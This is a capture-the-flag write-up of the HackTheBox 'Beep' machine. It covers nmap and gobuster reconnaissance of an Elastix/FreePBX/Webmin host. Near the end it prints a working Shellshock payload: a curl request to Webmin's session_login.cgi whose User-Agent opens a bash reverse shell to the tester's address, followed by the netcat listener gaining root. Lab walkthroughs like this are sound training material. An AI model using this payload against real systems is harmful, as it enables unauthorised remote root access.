---
description: Beep box from HackTheBox write up.
---

# Beep

## Nmap scan

```bash
Nmap scan report for 10.10.10.7
Host is up (0.039s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
879/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 22.03 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-29 11:13 EST
Nmap scan report for 10.10.10.7
Host is up (0.040s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|_  1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: STLS USER AUTH-RESP-CODE LOGIN-DELAY(0) RESP-CODES UIDL EXPIRE(NEVER) TOP IMPLEMENTATION(Cyrus POP3 server v2) APOP PIPELINING
|_sslv2: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: ACL CHILDREN OK ATOMIC STARTTLS Completed NO URLAUTHA0001 BINARY RENAME LIST-SUBSCRIBED QUOTA IMAP4rev1 SORT=MODSEQ LISTEXT UNSELECT CATENATE LITERAL+ IDLE CONDSTORE IMAP4 ID ANNOTATEMORE THREAD=REFERENCES THREAD=ORDEREDSUBJECT SORT MAILBOX-REFERRALS MULTIAPPEND RIGHTS=kxte NAMESPACE X-NETSCAPE UIDPLUS
|_sslv2: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-12-29T17:16:46+00:00; +1h00m02s from scanner time.
|_http-title: Elastix - Login page
879/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 1h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 307.86 seconds
```

A lot of ports open, I like to start with the web applications so let's go ahead.

## Port 80 and 443

The port 80 just redirect to 443 so they are the same. The certificate shows that `localhost.localdomain` is the domain name, for now I will not change my `hosts` file.

We are welcomed by the Elasticx login page, I tried some default credentials but no luck so I launched `gobuster`:
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u https://10.10.10.7/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/29 11:40:30 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]  
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]   
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]  
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] 
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]   
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]    
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]  
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]   
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]   
/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/] 
                                                                                    
===============================================================
2021/12/29 12:41:23 Finished
===============================================================
```

We can access the FreePBX admin panel in the `/admin` directory, again no luck with the credentials but we have version information: `FreePBX 2.8.1.4`.

In `/vtigercrm` we find another login page we cannot pass, sad.

I found some exploits that could work but I want to check the web service in the port 10000 first.

## Port 10000

This shows a Webmin login page, again no luck with the default credentials but looking to the URL we can see `/session_login.cgi`. 

### Shellshock

Let's test a simple Shellshock payload to get a reverse shell, maybe we are lucky:
```bash
curl 'https://10.10.10.7:10000/session_login.cgi' -k -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.29/8080 0>&1"' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://10.10.10.7:10000' -H 'Connection: keep-alive' -H 'Referer: https://10.10.10.7:10000/session_login.cgi' -H 'Cookie: testing=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'page=%2F&user=root&pass=root' > /dev/null
```
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.7] 52435
bash: no job control in this shell
[root@beep webmin]#
```
Wow! That worked and we are root already! We can get the user flag under: `/home/fanis/user.txt` and the root flag under `/root/root.txt`.
